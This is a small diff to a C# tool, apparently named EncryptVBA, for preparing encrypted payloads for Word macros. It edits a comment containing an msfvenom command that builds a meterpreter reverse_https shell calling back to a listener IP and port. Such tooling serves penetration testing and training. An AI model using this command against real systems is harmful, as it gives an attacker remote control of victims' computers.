@@ -7,7 +7,7 @@ namespace EncryptVBA
     {
         static void Main(string[] args)
         {
-// msfvenom -p windows/x64/meterpreter/reverse_https SessionExpirationTimeout=0 SessionCommunicationTimeout=0 LHOST=192.168.1.142 LPORT=443 EXITFUNC=thread -f csharp
+// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.142 LPORT=443 EXITFUNC=thread -f csharp
 // if is 32 bits Word, change the payload.
 // copy the entire payload from msfvenom
 
